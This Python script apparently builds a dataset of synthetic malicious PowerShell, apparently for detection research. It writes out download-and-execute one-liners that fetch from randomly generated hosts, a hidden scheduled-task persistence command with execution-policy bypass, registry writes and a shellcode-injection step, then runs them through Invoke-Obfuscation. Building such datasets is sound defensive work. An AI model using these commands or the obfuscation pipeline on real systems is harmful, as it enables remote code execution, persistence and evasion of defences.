#Generates a powershell script from the set of random malicious commands
import random
import string
import pexpect
import os
import sys
import math
import multiprocessing
import time

def get_random_dest():
	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
	if(random.randint(0,1) == 0):
		#Return a domain
		ext = "." + "".join([random.choice(string.ascii_lowercase) for _ in range(random.randint(2,3))])
		hostname = "".join([random.choice(string.ascii_letters) for _ in range(random.randint(10,20))])
		domain = "http://" + hostname + ext + path
		return domain
	else:
		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
		return ip + path

def get_random_text(min, max):
	return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(min,max))])

def get_random_word():
	return get_random_text(3,10)

def get_random_regkey():
	key_name = get_random_word()
	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
	return key_name, key_location

def get_random_shellcode():
	shellcode = ",".join([hex(random.randint(0,255)) for _ in range(150)])
	return shellcode

def remote_payload_cmd():
	dest = get_random_dest()
	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + dest + "\") \n"

#https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
def schtasks_persistence_cmd():
	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
	return cmd

def set_registry_key_cmd():
	cmd = "$code = \"" + get_random_text(50,100) + "\"\n"
	key_location, key_name = get_random_regkey()
	cmd += "Set-ItemProperty \"HKCU:\\" + key_location + "\\\" -Name " + key_name + " -Value " + "$code \n"
	return cmd

def inject_shellcode_cmd():
	cmd = "[Byte[]] $Shellcode = @(" + get_random_shellcode() + ") \n";
	cmd += "".join(open("./scripts/inject_shellcode.ps1").readlines())
	return cmd

# commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd, inject_shellcode_cmd]
#commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd] # inject shellcode seems to be broken when we try to obfuscate it :c
commands = [remote_payload_cmd,schtasks_persistence_cmd]

# AST doesnt work with schtasks and remote_payload
# set registry key has a 100% fail rate

def generate_script():
	script = ""
	script+= random.choice(commands)()
	#for f in [random.choice(commands) for _ in range(5)]:
		#script+=f()

	return script

def generate_raw(n):
	for i in range(n):
		script = generate_script()
		f = open(f"res/dataset-{i}-raw.ps1",'w')
		f.write(script)
		f.close()

#invoke_obfuscation_choices = ["TOKEN,ALL,1,HOME","AST,ALL,1,HOME","STRING,ALL,1,HOME","ENCODING,ALL,1,HOME"]
invoke_obfuscation_choices = ["TOKEN,ALL,1,HOME","STRING,ALL,1,HOME","ENCODING,ALL,1,HOME"]


locky = multiprocessing.Lock()
def obfuscate(script_num, conn):
	global locky
	#locky.acquire()

	package = [[],[],[],[]]
	try:
		#obfs_commands = ",".join([random.choice(invoke_obfuscation_choices) for _ in range(random.randint(1,4))])
		obfs_commands = random.choice(invoke_obfuscation_choices)

		if(random.randint(0,1) == 0):
			obfs_commands+=",COMPRESS,ALL,1,HOME"

		obfs_commands+= ",OUT"

		print(f"Script #{script_num}, commands for Invoke-Obfuscation = {obfs_commands}")

		p = pexpect.spawn(f"pwsh obfuscate.ps1 -Filename ./res/dataset-{str(script_num)}-raw.ps1 -Command {obfs_commands}")
		#p.read_nonblocking(size=10000)
		p.expect_exact("Enter path for output file (or leave blank for default): ")
		p.sendline(f"./res/dataset-{str(script_num)}-obfs.ps1")

		#pexpect.run(f"pwsh obfuscate.ps1 -Filename ./res/dataset-{str(script_num)}-raw.ps1 -Command {obfs_commands}", events={"or leave blank for default \\):": f"./res/dataset-{str(script_num)}-obfs.ps1"})
		
		print(f"Got to the waiting step #{script_num}")
		#p.wait() #this is the only one that works multithreaded
		p.interact() #this works but only singlethreaded
		#p.expect(pexpect.EOF) this should work but it just doesnt
		print(f"Succeeded script #{script_num}!")
		#p.close()

		package[0].append(str(script_num))
		package[1].append(obfs_commands)

	except Exception as e:
		print(f"!!! Obfuscation for script #{script_num} failed! Command = {obfs_commands}")
		print(e)

		package[2].append(str(script_num))
		package[3].append(obfs_commands)

	#locky.release()
	conn.send(package)
	conn.close()
	return


THREAD_NUM = int(sys.argv[2])

success = []
failed = []
succ_cmds = []
failed_cmds = []

def run_threads(targets):
	global success, failed, succ_cmds, failed_cmds
	threads = []
	pipes = []
	for target in targets:
		parent, child = multiprocessing.Pipe()
		t = multiprocessing.Process(target=obfuscate, args=[target, child])

		print(f"Starting thread target = {target}")
		t.start()
		threads.append(t)
		pipes.append(parent)

	for p in pipes:
		try:
			p.poll(60)
			package = p.recv()

			success += package[0]
			succ_cmds += package[1]
			failed += package[2]
			failed_cmds += package[3]

		except Exception as e:
			print("Timeout while polling for result", e)

	for t in threads:
		t.join()

	return success, failed, succ_cmds, failed_cmds

def generate_obfs(n):
	
	print("Generating fake malicious powershell")
	generate_raw(n)

	print("Converting to obfuscated powershell")
	
	for x in range(math.floor(n/THREAD_NUM)):
		targets = [x*THREAD_NUM + y for y in range(THREAD_NUM)]
		run_threads(targets)
	
	run_threads([x for x in range(n % THREAD_NUM)])

	print(f"Succeeded {str(len(success))}/{str(n)} |", success)

	#for fail in failed:
		#print(f"Deleting failed script {fail}")
		#os.system(f"rm res/dataset-{str(fail)}-raw.ps1")

	print("succeded", succ_cmds)
	print("failed", failed_cmds)
	print("Failed #", failed)

generate_obfs(int(sys.argv[1]))